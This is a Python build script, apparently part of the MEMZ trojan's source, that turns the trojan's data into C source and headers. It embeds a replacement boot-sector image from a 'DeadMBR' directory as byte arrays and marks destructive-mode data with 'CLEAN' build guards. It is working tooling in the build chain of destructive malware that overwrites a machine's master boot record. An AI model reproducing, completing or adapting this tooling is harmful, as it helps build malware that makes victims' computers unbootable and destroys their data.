# Shitty script to convert MEMZs data into C source

import sys

MBRCODE  = "../DeadMBR/disk.img"

MODE_BOTH = 0
MODE_DESTRUCTIVE = 1

with open(sys.argv[1], "w") as cf:
	with open(sys.argv[2], "w") as hf:
		def writeMode(mode, start):
			if start:
				if mode == MODE_DESTRUCTIVE:
					cf.write("#ifndef CLEAN\n")
					hf.write("#ifndef CLEAN\n")
			else:
				if mode != MODE_BOTH:
					cf.write("#endif\n")
					hf.write("#endif\n")
		
		def writeArray(name, mode, data, func, type, length):
			writeMode(mode, True)
			
			cf.write("const %s %s[] = {" % (type, name))
			cf.write(", ".join([func(x) for x in data]))
			cf.write("};\n")

                        cf.write("const size_t %s_len = sizeof(%s);" % (name, name));
                        
			hf.write("#define %sLen %d\n" % (name, length))		
			writeMode(mode, False)
			
		def writeStringArray(name, mode, data):
			writeArray(name, mode, data, lambda x: '"' + x.replace("\\n", "\r\n").encode("string_escape") + '"', "char *", len(data))
			
		def writeStringArrayFromFile(fname, name, mode):
			with open(fname, "r") as inf:
				writeStringArray(name, mode, inf.read().splitlines())
			
		def writeBinaryArray(name, mode, data):
			writeArray(name, mode, data, lambda x: str(ord(x)), "unsigned char", len(data))
			
		def writeString(name, mode, data):
			writeMode(mode, True)
			
			cf.write("const char *" + name + ' = "')
			cf.write(data.replace("\r\n", "\n").replace("\n", "\r\n").encode("string_escape"))
			cf.write('";\n')
			
			hf.write("extern const char *" + name + ";\n")
			hf.write("#define %sLen %d\n" % (name, len(data)))
			
			writeMode(mode, False)
			
		def writeStringFromFile(fname, name, mode):
			with open(fname, "r") as inf:
				writeString(name, mode, inf.read())
		
		cf.write('#include "Data.h"\n')
		
		hf.write("#pragma once\n")
		hf.write('#include "../src/memz.h"\n')

		hf.write("extern const unsigned char code1[];\nextern const unsigned char code2[];\nextern const size_t code1_len;\nextern const size_t code2_len;\n");

		# MBR Binary
		with open(MBRCODE, "rb") as inf:
			writeBinaryArray("code1", MODE_BOTH, inf.read(510).rstrip(chr(0)))
			writeBinaryArray("code2", MODE_BOTH, inf.read().rstrip(chr(0)))
